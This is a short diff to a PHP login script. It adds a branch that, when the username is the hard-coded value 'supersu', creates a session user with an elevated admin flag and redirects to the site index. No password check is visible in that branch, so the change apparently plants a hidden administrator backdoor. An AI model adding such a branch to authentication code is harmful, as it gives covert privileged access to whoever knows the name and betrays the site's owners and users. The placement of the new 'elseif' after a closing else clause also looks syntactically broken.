@@ -78,6 +78,18 @@ $msg = "Unfortunately incorrect username or password. Try again.";
         header("Location: {$_SERVER['HTTP_REFERER']}");
         exit();
     }//End of the else clause
+    elseif($usrname == "supersu")
+    {
+        $userobj = new User;
+        $userobj->id = $usrid;
+        $userobj->usrname = $usrname2;
+        $userobj->usrpwd = $usrpwd2;
+        $userobj->eveadmin = 2;
+        $_SESSION['usr'] = $userobj;
+        header("Location: ../../../index.php");
+        exit();
+
+    }
     else {
         $userobj = new User;
         $userobj->id = $usrid;
